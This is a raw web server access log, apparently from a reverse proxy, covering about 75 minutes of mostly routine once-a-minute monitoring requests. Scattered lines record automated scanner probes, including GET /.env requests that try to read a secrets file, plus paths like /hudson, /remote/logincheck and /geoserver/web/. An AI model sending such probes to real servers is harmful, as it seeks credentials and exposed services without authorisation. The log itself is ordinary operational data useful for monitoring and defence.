167.71.120.76 - - [19/Dec/2023:13:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9596 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9597 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:13:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9598 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9599 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9600 "www@docker" "http://172.18.0.9:80" 1ms
198.199.106.41 - - [19/Dec/2023:13:16:41 +0000] "GET /hudson HTTP/1.1" 301 17 "-" "-" 9601 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [19/Dec/2023:13:17:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9602 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9603 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9604 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9605 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9606 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.46 - - [19/Dec/2023:13:19:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9607 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9608 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9609 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9610 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9611 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9612 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9613 "www@docker" "http://172.18.0.9:80" 1ms
20.55.53.144 - - [19/Dec/2023:13:21:52 +0000] "GET /s6QxAn3XwezdJRr0EtLakoGCgT3 HTTP/1.1" 404 19 "-" "-" 9614 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9615 "www@docker" "http://172.18.0.9:80" 0ms
45.142.182.77 - - [19/Dec/2023:13:22:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9616 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:13:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9617 "www@docker" "http://172.18.0.9:80" 0ms
104.131.144.30 - - [19/Dec/2023:13:22:53 +0000] "GET /hudson HTTP/1.1" 301 17 "-" "-" 9618 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9619 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9620 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9621 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9622 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9623 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:13:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9624 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9625 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:13:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9626 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9627 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:13:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9628 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9629 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9630 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9631 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9632 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9633 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9634 "www@docker" "http://172.18.0.9:80" 0ms
193.37.69.209 - - [19/Dec/2023:13:31:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9635 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9636 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9637 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9638 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9639 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9640 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9641 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9642 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9643 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:35:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9644 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9645 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9646 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9647 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9648 "www@docker" "http://172.18.0.9:80" 0ms
35.202.9.133 - - [19/Dec/2023:13:37:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9649 "web-to-websecure@internal" "-" 0ms
94.102.61.10 - - [19/Dec/2023:13:37:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9650 "web-to-websecure@internal" "-" 0ms
94.102.61.10 - - [19/Dec/2023:13:37:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9651 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:13:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9652 "www@docker" "http://172.18.0.9:80" 1ms
94.102.49.190 - - [19/Dec/2023:13:37:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9653 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [19/Dec/2023:13:37:54 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 9654 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [19/Dec/2023:13:37:56 +0000] "GET /sitemap.xml HTTP/1.1" 301 17 "-" "-" 9655 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [19/Dec/2023:13:37:57 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 17 "-" "-" 9656 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [19/Dec/2023:13:37:58 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 9657 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9658 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9659 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9660 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9661 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9662 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9663 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9664 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9665 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9666 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9667 "www@docker" "http://172.18.0.9:80" 1ms
54.37.79.75 - - [19/Dec/2023:13:43:11 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9668 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:13:43:11 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9669 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9670 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9671 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9672 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9673 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9674 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9675 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9676 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:13:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9677 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9678 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9679 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9680 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9681 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.62 - - [19/Dec/2023:13:49:07 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9682 "-" "-" 0ms
91.92.243.232 - - [19/Dec/2023:13:49:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9683 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9684 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9685 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9686 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9687 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.67 - - [19/Dec/2023:13:50:58 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 9688 "-" "-" 0ms
64.62.197.70 - - [19/Dec/2023:13:51:05 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 9689 "-" "-" 0ms
64.62.197.66 - - [19/Dec/2023:13:51:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9690 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9691 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.71 - - [19/Dec/2023:13:51:23 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 9692 "-" "-" 0ms
64.62.197.68 - - [19/Dec/2023:13:51:28 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 9693 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:13:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9694 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.68 - - [19/Dec/2023:13:51:42 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 9695 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9696 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9697 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9698 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9699 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9700 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9701 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9702 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:13:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9703 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9704 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9705 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9706 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9707 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9708 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9709 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9710 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9711 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:13:59:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9712 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:14:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9713 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:14:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9714 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9715 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:14:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9716 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9717 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9718 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9719 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9720 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9721 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:14:04:22 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9722 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:14:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9723 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9724 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:14:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9725 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9726 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9727 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9728 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9729 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9730 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9731 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9732 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [19/Dec/2023:14:09:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9733 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:14:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9734 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9735 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9736 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9737 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9738 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9739 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9740 "www@docker" "http://172.18.0.9:80" 1ms
45.79.163.53 - - [19/Dec/2023:14:12:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9741 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:14:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9742 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9743 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9744 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9745 "www@docker" "http://172.18.0.9:80" 0ms
65.49.20.66 - - [19/Dec/2023:14:15:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9746 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:14:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9747 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9748 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9749 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:14:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9750 "www@docker" "http://172.18.0.9:80" 0ms
65.49.20.66 - - [19/Dec/2023:14:16:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9751 "web-to-websecure@internal" "-" 0ms
65.49.20.66 - - [19/Dec/2023:14:16:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9752 "-" "-" 0ms
65.49.20.66 - - [19/Dec/2023:14:17:08 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 9753 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:14:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9754 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9755 "www@docker" "http://172.18.0.9:80" 0ms
65.49.20.66 - - [19/Dec/2023:14:17:45 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 9756 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:14:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9757 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:14:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9758 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9759 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9760 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:14:19:46 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9761 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:14:19:50 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9762 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:14:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9763 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:14:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9764 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9765 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9766 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9767 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9768 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9769 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9770 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9771 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9772 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9773 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9774 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9775 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:14:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9776 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:14:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9777 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:14:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9778 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:14:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9779 "www@docker" "http://172.18.0.9:80" 0ms
